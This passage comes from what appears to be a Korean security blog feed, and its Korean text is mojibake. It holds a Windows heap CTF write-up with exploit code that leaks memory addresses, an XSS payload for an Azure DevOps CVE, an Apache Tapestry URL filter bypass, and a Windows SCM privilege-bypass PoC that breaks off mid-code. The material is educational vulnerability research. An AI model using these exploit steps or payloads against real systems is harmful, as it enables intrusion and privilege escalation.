ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ul><li>ntdll base: ROP gadget</li><li>image base</li><li>kernel32 base: <code>CreateFile()</code>, <code>ReadFile()</code>, <code>WriteFile()</code></li><li>PEB : <code>ProcessParameters</code>(stdin, stdout, stderr)</li><li>stack address</li></ul><h2 id="ntdll-base"><a href="#ntdll-base" class="headerlink" title="ntdll base"></a>ntdll base</h2><p><code>_HEAP-&gt;LockVariable-&gt;Lock</code> ì€ <code>heap_base + 0x2c0</code> ì— ìœ„ì¹˜í•´ ìˆìŠµë‹ˆë‹¤. </p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2016.png" alt="pwncoolsexy-part4/Untitled%2016.png"></p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2017.png" alt="pwncoolsexy-part4/Untitled%2017.png"></p><p><code>Lock - 0x163d30</code> ë¡œ ntdllì˜ base addressë¥¼ êµ¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. (ê·¸ë¦¬ê³  ìœˆë„ìš° ì—…ë°ì´íŠ¸ ë•Œë¬¸ì— ntdll ë²„ì „ì´ ë°”ë€Œì–´ <code>0x163dd0</code>ìœ¼ë¡œ ë°”ë€Œì—ˆë‹¤ëŠ” ìŠ¬í”ˆ ì‚¬ì—°ì´â€¦ ì—…ë°ì´íŠ¸ ë¯¸ì›Œ)</p><pre><code class="hljs python"><span class="hljs-comment">#...</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">readmem</span>(<span class="hljs-params">key, addr</span>):</span>add(<span class="hljs-string">&quot;LFH4&quot;</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span> + p64(addr))view(key)p.recvuntil(<span class="hljs-string">&quot;Data:&quot;</span>)<span class="hljs-keyword">return</span> u64(p.recv(<span class="hljs-number">8</span>))<span class="hljs-comment">#...</span>Lock = readmem(key, heap_base+<span class="hljs-number">0x2c0</span>)<span class="hljs-comment"># _HEAP-&gt;LockVariable-&gt;Lock</span>ntdll = Lock - <span class="hljs-number">0x163dd0</span> <span class="hljs-comment">#Lock - ntdll base address offset</span>print(hex(ntdll))</code></pre><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2018.png" alt="pwncoolsexy-part4/Untitled%2018.png"></p><h2 id="Imagebase"><a href="#Imagebase" class="headerlink" title="Imagebase"></a>Imagebase</h2><p>ntdll ì£¼ì†Œë¥¼ êµ¬í–ˆìœ¼ë©´ ë°”ì´ë„ˆë¦¬ì˜ imagebaseë„ ê¸ˆë°© êµ¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë°”ë¡œ <code>PebLdr</code> ì„ ì´ìš©í•´ì„œ êµ¬í•˜ë©´ ë©ë‹ˆë‹¤!</p><blockquote><p>PebLdr : ë¡œë“œëœ ëª¨ë“ˆë“¤ì˜ Double Linked Listë¥¼ ë‹´ê³  ìˆìœ¼ë©° <code>_PEBâ†’Ldr</code>ì—ì„œ ì°¸ì¡°í•œë‹¤.</p></blockquote><pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; lm start             end                 module name...           <span class="hljs-number">00007f</span>fd`ea290000 <span class="hljs-number">00007f</span>fd`ea47d000   ntdll      (pdb symbols)    <span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; dt ntdll!_PEB @$peb Ldr   +<span class="hljs-number">0x018</span> Ldr : <span class="hljs-number">0x00007ffd</span>`ea3f53c0 _PEB_LDR_DATA<span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; dx -r1 ((ntdll!_PEB_LDR_DATA *)<span class="hljs-number">0x7ffdea3f53c0</span>)((ntdll!_PEB_LDR_DATA *)<span class="hljs-number">0x7ffdea3f53c0</span>)            : <span class="hljs-number">0x7ffdea3f53c0</span> [Type: _PEB_LDR_DATA *]    [+<span class="hljs-number">0x000</span>] Length           : <span class="hljs-number">0x58</span> [Type: unsigned long]    [+<span class="hljs-number">0x004</span>] Initialized      : <span class="hljs-number">0x1</span> [Type: unsigned char]    [+<span class="hljs-number">0x008</span>] SsHandle         : <span class="hljs-number">0x0</span> [Type: <span class="hljs-built_in">void</span> *]    [+<span class="hljs-number">0x010</span>] InLoadOrderModuleList [Type: _LIST_ENTRY]    [+<span class="hljs-number">0x020</span>] InMemoryOrderModuleList [Type: _LIST_ENTRY]...<span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; ? <span class="hljs-number">00007f</span>fd`ea3f53c0 - <span class="hljs-number">00007f</span>fd`ea290000Evaluate expression: <span class="hljs-number">1463232</span> = <span class="hljs-number">00000000</span>`<span class="hljs-number">001653</span>c0</code></pre><p><code>PebLdr</code> ì€ <code>ntdll + 0x1653c0</code> ì´ ë˜ê² ë„¤ìš”. ê·¸ëŸ¼ <code>PebLdr</code>ì—ì„œ ë¬¸ì œ ë°”ì´ë„ˆë¦¬ dadadbë¥¼ ì°¾ì•„ë³´ê² ìŠµë‹ˆë‹¤.</p><p>ëª¨ë“ˆì´ ë¡œë“œë˜ë©´ <code>ntdll!_PEB_LDR_DATAâ†’InMemoryOrderModuleList(+0x20)</code> ì— ë¨¼ì € ë¡œë“œëœ ìˆœì„œëŒ€ë¡œ Double Linked Listë¡œ ì—°ê²°ë©ë‹ˆë‹¤. ê·¸ëŸ¼ ì‹¤í–‰ì¤‘ì¸ ë°”ì´ë„ˆë¦¬ë„ ë‹¹ì—°íˆ ì˜¬ë¼ì™€ ìˆê² ì£ ?</p><pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; dx -r1 (*((ntdll!_LIST_ENTRY *)<span class="hljs-number">0x7ffdea3f53e0</span>))(*((ntdll!_LIST_ENTRY *)<span class="hljs-number">0x7ffdea3f53e0</span>))                 [Type: _LIST_ENTRY]    [+<span class="hljs-number">0x000</span>] Flink            : <span class="hljs-number">0x185b0702660</span> [Type: _LIST_ENTRY *]    [+<span class="hljs-number">0x008</span>] Blink            : <span class="hljs-number">0x185b0704020</span> [Type: _LIST_ENTRY *]<span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; dps <span class="hljs-number">0x185b0702660</span><span class="hljs-number">00000185</span>`b0702660  <span class="hljs-number">00000185</span>`b07024d0<span class="hljs-number">00000185</span>`b0702668  <span class="hljs-number">00007f</span>fd`ea3f53e0 ntdll!PebLdr+<span class="hljs-number">0x20</span><span class="hljs-number">00000185</span>`b0702670  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-number">00000185</span>`b0702678  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-number">00000185</span>`b0702680  <span class="hljs-number">00007f</span>f6`<span class="hljs-number">5f</span>1d0000 dadadb<span class="hljs-number">00000185</span>`b0702688  <span class="hljs-number">00007f</span>f6`<span class="hljs-number">5f</span>1d1eb0 dadadb+<span class="hljs-number">0x1eb0</span><span class="hljs-number">00000185</span>`b0702690  <span class="hljs-number">00000000</span>`<span class="hljs-number">00009000</span>...</code></pre><p>ì˜ ì˜¬ë¼ì™€ ìˆë„¤ìš”! </p><pre><code class="hljs python"><span class="hljs-comment">#...</span>pebldr = ntdll + <span class="hljs-number">0x1653c0</span>IMOML = readmem(key, pebldr+<span class="hljs-number">0x20</span>)print(<span class="hljs-string">&quot;InMemoryOrderModuleList: &quot;</span>,hex(IMOML))imagebase = readmem(key, IMOML+<span class="hljs-number">0x20</span>)print(<span class="hljs-string">&quot;imagebase :&quot;</span>,hex(imagebase))<span class="hljs-comment">#...</span></code></pre><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2019.png" alt="pwncoolsexy-part4/Untitled%2019.png"></p><h2 id="kernel32-base"><a href="#kernel32-base" class="headerlink" title="kernel32 base"></a>kernel32 base</h2><p>imagebaseë¥¼ êµ¬í–ˆìœ¼ë‹ˆ kernel32 base addressëŠ” IAT í…Œì´ë¸”ì„ ì´ìš©í•´ ì‰½ê²Œ êµ¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ìì„¸í•œ ë°©ë²•ì€ ì œê°€ ì‘ë…„ì— ì¶œì œí•œ ë¬¸ì œì¸ <a href="https://hackyboiz.github.io/2020/12/29/l0ch/address_book/#Exploit">Christmas CTF 2020 - addressbook</a> write-upì— ì„¤ëª…ë˜ì–´ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; !dh <span class="hljs-number">00007f</span>f6`a72d0000...<span class="hljs-number">3000</span> [     <span class="hljs-number">230</span>] address [size] of Import Address Table Directory...<span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; lmstart             end                 module name...    <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea60000 <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>eb12000   KERNEL32   (pdb symbols) ...                <span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; dps <span class="hljs-number">00007f</span>f6`a72d0000 + <span class="hljs-number">3000</span> L230<span class="hljs-number">00007f</span>f6`a72d3000  <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea82460 KERNEL32!ReadFile<span class="hljs-number">00007f</span>f6`a72d3008  <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea7e7e0 KERNEL32!HeapCreateStub<span class="hljs-number">00007f</span>f6`a72d3010  <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea763a0 KERNEL32!HeapFreeStub<span class="hljs-number">00007f</span>f6`a72d3018  <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea7c660 KERNEL32!GetStdHandleStub<span class="hljs-number">00007f</span>f6`a72d3020  <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ed7aa20 ntdll!RtlAllocateHeap<span class="hljs-number">00007f</span>f6`a72d3028  <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea7e970 KERNEL32!IsDebuggerPresentStub<span class="hljs-number">00007f</span>f6`a72d3030  <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>edb4410 ntdll!RtlInitializeSListHead...<span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; ? <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea82460 - <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea60000Evaluate expression: <span class="hljs-number">140384</span> = <span class="hljs-number">00000000</span>`<span class="hljs-number">00022460</span></code></pre><p><code>kernel32!ReadFile</code> í•¨ìˆ˜ëŠ” kernel32 baseì˜ <code>0x22460</code>ì— ìœ„ì¹˜í•´ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs python">kernel32 = readmem(key, imagebase+<span class="hljs-number">0x3000</span>) - <span class="hljs-number">0x22460</span>print(<span class="hljs-string">&quot;kernel32 :&quot;</span>,hex(kernel32))</code></pre><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2020.png" alt="pwncoolsexy-part4/Untitled%2020.png"></p><p>ì ì´ì œ ê±°ì˜ ë‹¤ì™”ìŠµë‹ˆë‹¤..!</p><h2 id="PEB-Stack-address"><a href="#PEB-Stack-address" class="headerlink" title="PEB/Stack address"></a>PEB/Stack address</h2><p><code>!address -summary</code> ë¡œ PEBì™€ TEB, Stackì£¼ì†Œë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; !address -summary--- Largest Region by Usage ----------- Base Address -------- Region Size ----------Free                                    <span class="hljs-number">275</span>`<span class="hljs-number">1e0</span>c0000     <span class="hljs-number">7</span>b7f`<span class="hljs-number">3</span>dea0000 ( <span class="hljs-number">123.497</span> TB)MappedFile                             <span class="hljs-number">7</span>df5`<span class="hljs-number">5f</span>ec4000      <span class="hljs-number">1f</span>f`d6aed000 (   <span class="hljs-number">1.999</span> TB)&lt;unknown&gt;                              <span class="hljs-number">7</span>df4`<span class="hljs-number">5</span>c060000        <span class="hljs-number">1</span>`<span class="hljs-number">00020000</span> (   <span class="hljs-number">4.000</span> GB)Image                                  <span class="hljs-number">7f</span>fd`<span class="hljs-number">4</span>a817000        <span class="hljs-number">0</span>`<span class="hljs-number">00163000</span> (   <span class="hljs-number">1.387</span> MB)Stack                                    e4`<span class="hljs-number">4f</span>c00000        <span class="hljs-number">0</span>`<span class="hljs-number">000f</span>c000 (<span class="hljs-number">1008.000</span> kB)Heap                                    <span class="hljs-number">275</span>`<span class="hljs-number">1</span>dfce000        <span class="hljs-number">0</span>`<span class="hljs-number">000f</span>1000 ( <span class="hljs-number">964.000</span> kB)Other                                  <span class="hljs-number">7</span>df5`<span class="hljs-number">5e0</span>a0000        <span class="hljs-number">0</span>`<span class="hljs-number">00033000</span> ( <span class="hljs-number">204.000</span> kB)TEB                                      e4`<span class="hljs-number">4f</span>9ca000        <span class="hljs-number">0</span>`<span class="hljs-number">00002000</span> (   <span class="hljs-number">8.000</span> kB)PEB                                      e4`<span class="hljs-number">4f</span>9c9000        <span class="hljs-number">0</span>`<span class="hljs-number">00001000</span> (   <span class="hljs-number">4.000</span> kB)</code></pre><p>PEBëŠ” ntdllì˜ bss ì˜ì—­ì— ìœ„ì¹˜í•˜ë©° PEB ì£¼ì†ŒëŠ” ì•„ê¹Œ êµ¬í•œ <code>pebldr</code> ì£¼ì†Œ ê·¼ì²˜ì— ìˆìœ¼ë‹ˆ ë’¤ì ë’¤ì ê±°ë¦¬ë©° ì°¾ë‹¤ ë³´ë©´ ë‚˜ì˜µë‹ˆë‹¤ ã…ã…;</p><pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; lmstart             end                 module name    ...    <span class="hljs-number">00007f</span>fd`<span class="hljs-number">4</span>d6a0000 <span class="hljs-number">00007f</span>fd`<span class="hljs-number">4</span>d890000   ntdll<span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; dt ntdll!_PEB @$peb Ldr   +<span class="hljs-number">0x018</span> Ldr : <span class="hljs-number">0x00007ffd</span>`<span class="hljs-number">4</span>d8053c0 _PEB_LDR_DATA<span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; dps <span class="hljs-number">0x00007ffd</span>`<span class="hljs-number">4</span>d8053c0  - <span class="hljs-number">100</span><span class="hljs-number">00007f</span>fd`<span class="hljs-number">4</span>d8052c0  ffffffff`ffffffff...<span class="hljs-number">00007f</span>fd`<span class="hljs-number">4</span>d805328  <span class="hljs-number">000000e4</span>`<span class="hljs-number">4f</span>9c9240<span class="hljs-number">00007f</span>fd`<span class="hljs-number">4</span>d805330  <span class="hljs-number">00000000</span>`<span class="hljs-number">00620026</span><span class="hljs-number">00007f</span>fd`<span class="hljs-number">4</span>d805338  <span class="hljs-number">00000275</span>`<span class="hljs-number">1</span>dfc2470</code></pre><p><code>PEB+0x240</code>ì€ <code>ntdll+0x165328</code>ì— ìˆìœ¼ë©° TEBëŠ” <code>PEB + 0x1000</code>ì—, Stack addressëŠ” <code>TEB + 0x10</code>ì— ìˆìœ¼ë‹ˆ ê°™ì´ êµ¬í•˜ê² ìŠµë‹ˆë‹¤.</p><pre><code class="hljs python">peb = readmem(key, ntdll + <span class="hljs-number">0x165328</span>) - <span class="hljs-number">0x240</span>teb = peb + <span class="hljs-number">0x1000</span>stack = readmem(key, teb+<span class="hljs-number">0x10</span>)print(<span class="hljs-string">&quot;peb :&quot;</span>,hex(peb))print(<span class="hljs-string">&quot;teb :&quot;</span>,hex(teb))</code></pre><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2021.png" alt="pwncoolsexy-part4/Untitled%2021.png"></p><hr><p>ë“œë””ì–´ã…“ã…“ã…“ ìµìŠ¤ì— í•„ìš”í•œ ëª¨ë“  ì •ë³´ë¥¼ êµ¬í–ˆìŠµë‹ˆë‹¤! </p><p>ë‹¤ìŒ íŒŒíŠ¸ì—ì„œëŠ” ë³¸ê²©ì ìœ¼ë¡œ exploitì„ í•´ë³´ë„ë¡ í•˜ê² ìœ¼ë©° ì „ ê·¸ëŸ¼ ì´ë¯¸ ë§í•œ ì¤‘ê°„ê³ ì‚¬ ê³µë¶€í•˜ëŸ¬ 20000..</p><h1 id="Part-5-ì˜ˆê³ "><a href="#Part-5-ì˜ˆê³ " class="headerlink" title="Part 5 ì˜ˆê³ "></a>Part 5 ì˜ˆê³ </h1><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2022.png" alt="pwncoolsexy-part4/Untitled%2022.png"></p><blockquote><p>??? : ë‚˜ë§ŒìµìŠ¤ì•ˆë¼ë‚˜ë§ŒìµìŠ¤ì•ˆë¼ë‚˜ë§ŒìµìŠ¤ì•ˆë¼   -2020 ê²¨ìš¸, í¬ë¦¬ìŠ¤ë§ˆìŠ¤ CTF ë¬¸ì œ ì œì‘ ì¤‘-</p></blockquote><p>ê³¼ì—° ë‹¤ìŒ ê¸€ì—ì„œëŠ” ì‘ë…„ê³¼ ê°™ì€ ì°¸ì‚¬ ì—†ì´ ìµìŠ¤ì— ì„±ê³µí•´ Flagë¥¼ ì˜ì ‘í•  ìˆ˜ ìˆì„ì§€â€¦</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>heap</tag>
      
      <tag>ctf</tag>
      
      <tag>L0ch</tag>
      
      <tag>research</tag>
      
      <tag>lfh</tag>
      
      <tag>nt heap</tag>
      
      <tag>hitcon</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-28459: Microsoft Azure DevOps Server Reflected XSS</title>
    <link href="/2021/04/17/fabu1ous/2021-04-17/"/>
    <url>/2021/04/17/fabu1ous/2021-04-17/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://packetstormsecurity.com/files/162190/SA-20210414-0.txt">CVE-2021-28459</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Microsoft Azure DevOps Server 2020.0.1</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Azure DevOps ServerëŠ” íŒ€ ë‹¨ìœ„ì˜ ì†Œí”„íŠ¸ì›Œì–´ ê°œë°œ í˜‘ì—… íˆ´ì…ë‹ˆë‹¤. í”„ë¡œì íŠ¸ íŒŒì¼ ì—…ë¡œë“œ ê¶Œí•œì„ ê°–ëŠ” í•´ì»¤ëŠ” í”„ë¡œì íŠ¸ì˜ Collection Settingì— ì ‘ê·¼í•´ Reflected XSS ê³µê²©ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ProcessTemplate</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">metadata</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>XSS here: <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(document.URL)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>This template is flexible and will work great<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;aa12a345-00a0-1f11-ba00-b12345b12345&quot;</span> <span class="hljs-attr">major</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">minor</span>=<span class="hljs-string">&quot;0&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span></code></pre><p>í”„ë¡œì íŠ¸ íŒŒì¼ì„ ì—…ë¡œë“œí•  ê¶Œí•œì´ ìˆëŠ” ì¸ì¦ëœ ì‚¬ìš©ìëŠ” Collection Setting &gt; Processì— <code>.zip</code>íŒŒì¼ í˜•íƒœë¡œ í”„ë¡œì„¸ìŠ¤ íƒ¬í”Œë¦¿ì„ ì—…ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. íƒ¬í”Œë¦¿ êµ¬ì¡°ì— ë”°ë¥´ë©´ <code>ProcessTemplate.xml</code> íŒŒì¼ì€ <code>&lt;name&gt;</code>ì„ í¬í•¨í•´ì•¼ í•˜ëŠ”ë° XSS ì·¨ì•½ì ì´ ìˆì–´ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>íƒ¬í”Œë¦¿ ì—…ë¡œë“œ ì‹œ í”„ë¡œì„¸ìŠ¤ í…œí”Œë¦¿ì´ ë³€ê²½ë˜ì—ˆë‹¤ëŠ” ë©”ì„¸ì§€ë¥¼ ë„ìš°ë©° ì‚½ì…ëœ JavaScriptê°€ ì‹¤í–‰ë©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>xss</tag>
      
      <tag>microsoft</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-27850: Apache Tapestry CVE-2019-0195 Bypass </title>
    <link href="/2021/04/16/l0ch/2021-04-16/"/>
    <url>/2021/04/16/l0ch/2021-04-16/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://seclists.org/oss-sec/2021/q2/23">CVE-2021-27850: Apache Tapestry: Bypass of the fix for CVE-2019-0195</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Apache Tapestry 5.4.5, 5.5.0, 5.6.2 ë° 5.7.0 ì´ì „ ë²„ì „</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ì˜¤í”ˆì†ŒìŠ¤ ì›¹ í”„ë ˆì„ì›Œí¬ì¸ Apache Tapestryì—ì„œ ë°œê²¬ëœ ì›ê²© ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì  CVE-2019-0195 íŒ¨ì¹˜ ìš°íšŒì˜ ì„¸ë¶€ ì •ë³´ê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>CVE-2019-0195ëŠ” ì„ì˜ì˜ í´ë˜ìŠ¤ íŒŒì¼ì„ ë‹¤ìš´ë¡œë“œí•  ìˆ˜ ìˆì–´ í•´ì»¤ê°€ ì´ë¥¼ ì´ìš©í•˜ë©´ serialized Java ê°ì²´ ì„œëª…ì— ì‚¬ìš©ë˜ëŠ” <code>HMAC</code> ë¹„ë°€ í‚¤ë¥¼ ì•Œì•„ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•´ì»¤ëŠ” íšë“í•œ <code>HMAC</code> ë¹„ë°€ í‚¤ë¡œ <code>CommonsBeanUtils1</code>ê³¼ ê°™ì€ Java RCE gadget ì²´ì¸ì— ì„œëª…í•  ìˆ˜ ìˆê³  ì´ëŠ” ì›ê²© ì½”ë“œ ì‹¤í–‰ìœ¼ë¡œ ì´ì–´ì§‘ë‹ˆë‹¤.</p><p>ìœ„ ì·¨ì•½ì ì€ URL requestì— <code>.class</code> , <code>.properties</code> , <code>.xml</code> ì´ ìˆëŠ”ì§€ í™•ì¸í•˜ê³  ì´ë¥¼ í•„í„°ë§í•˜ëŠ” ê²ƒìœ¼ë¡œ íŒ¨ì¹˜ë˜ì—ˆìœ¼ë‚˜ payload URLì˜ ëì— <code>/</code> ë¥¼ ì¶”ê°€í•˜ë©´ í•„í„°ë§ì„ ê°„ë‹¨í•˜ê²Œ ìš°íšŒí•´ ê¸°ì¡´ ì·¨ì•½ì ì„ í™œìš©í•  ìˆ˜ ìˆëŠ” ê²ƒìœ¼ë¡œ í™•ì¸ë˜ì—ˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs cpp">http:<span class="hljs-comment">//[host ip]/assets/.../services/AppModule.class   -&gt; &quot;.class&quot; í•„í„°ë§ ì ìš©ë¨ </span>http:<span class="hljs-comment">//[host ip]/assets/.../services/AppModule.class/  -&gt; &quot;.class&quot; í•„í„°ë§ ìš°íšŒ</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>deserialization</tag>
      
      <tag>apache</tag>
      
      <tag>bypass</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Windows SCM Remote Access Check Limit Bypass EoP</title>
    <link href="/2021/04/15/insu/2021-04-15/"/>
    <url>/2021/04/15/insu/2021-04-15/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2147">Issue 2147: Windows: SCM Remote Access Check Limit Bypass EoP</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows 10 20H2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows 10 1709 ì´í›„ ì›ê²©ìœ¼ë¡œ local admin groupì´ ì•„ë‹Œ ì›ê²© ì‚¬ìš©ìê°€ <code>SCM</code> ë° <code>service access</code>ì— ì ‘ê·¼ í•  ìˆ˜ ì—†ë„ë¡ ì ìš©ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>ì‚¬ìš©ìê°€ local ê´€ë¦¬ì ê·¸ë£¹ì— ì—†ëŠ” ê²½ìš° <code>OpenSCManager</code> ë˜ëŠ” <code>OpenService</code>ì— ì „ë‹¬ëœ <code>Access mask</code>ê°€ <code>0xD0072</code>ì— ëŒ€í•´ <code>ScAccessCheckAndAudit</code>ì—ì„œ ê²€ì‚¬ë©ë‹ˆë‹¤. ë§Œì•½ access maskì— access ê¶Œí•œì´ ìˆìœ¼ë©´ SCMì´ <code>access denied error</code>ì™€ í•¨ê»˜ ê±°ì ˆí•©ë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ë©´ ì›ê²© ì‚¬ìš©ìê°€ <code>SERVICE_START</code> í˜¹ì€ <code>SC_MANAGER_CREATE_SERVICE</code>ë¥¼ ì‚¬ìš© í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.</p><p>í•˜ì§€ë§Œ ì›í•˜ëŠ” access ê¶Œí•œì€ RPC í˜¸ì¶œì—ì„œ <code>NtAccessCheckAndAuditAlarm</code>ìœ¼ë¡œ ì „ë‹¬ë˜ê³  access ê¶Œí•œì€ <code>Service Handle</code>ì— ë‹¤ì‹œ ê¸°ë¡ë©ë‹ˆë‹¤.</p><p>ë”°ë¼ì„œ ì´ ê²€ì¦ì€ <code>MAXIMUM_ALLOWED</code>ë¥¼ request í•¨ìœ¼ë¡œì¨ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. POC ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs python"><span class="hljs-comment">#include &lt;stdio.h&gt;</span><span class="hljs-comment">#include &lt;windows.h&gt;</span>int wmain(int argc, wchar_t** argv)&#123;    <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">3</span>)    &#123;        printf(<span class="hljs-string">&quot;Usage: HostName ServiceName\\n&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    &#125;    auto scm = OpenSCManager(argv[<span class="hljs-number">1</span>], nullptr, MAXIMUM_ALLOWED);    <span class="hljs-keyword">if</span> (scm == nullptr)    &#123;        printf(<span class="hljs-string">&quot;[ERROR]: Failed to open SCM error:%d\\n&quot;</span>, GetLastError());        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    &#125;    auto service = OpenService(scm, argv[<span class="hljs-number">2</span>], SERVICE_START);    <span class="hljs-keyword">if</span> (service)    &#123;        printf(<span class="hljs-string">&quot;[ERROR]: Was granted SERVICE_START when we didn&#x27;t expect it. Maybe using the wrong user?\\n&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    &#125;    DWORD error = GetLastError();    <span class="hljs-keyword">if</span> (error == ERROR_SERVICE_DOES_NOT_EXIST)    &#123;        printf(<span class="hljs-string">&quot;[ERROR]: Service doesn&#x27;t exist.\\n&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    &#125;    <span class="hljs-keyword">if</span> (error != ERROR_ACCESS_DENIED)    &#123;        printf(<span class="hljs-string">&quot;[ERROR]: Expected ERROR_ACCESS_DENIED but got %d, the rest might not work.\\n&quot;</span>, GetLastError());    &#125;    service = OpenService(scm, argv[<span class="hljs-number">2</span>], MAXIMUM_ALLOWED);    <span class="hljs-keyword">if</span> (service == nullptr)    &#123;        printf(<span class="hljs-string">&quot;[ERROR]: Failed to open service error:%d\\n&quot;</span>, GetLastError());        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    &#125;    error = ERROR_SUCCESS;    <span class="hljs-keyword">if</span> (!StartService(service, <span class="hljs-number">0</span>, nullptr))    &#123;        error = GetLastError();    &#125;    switch (error)    &#123;        case ERROR_ACCESS_DENIED:            printf(<span 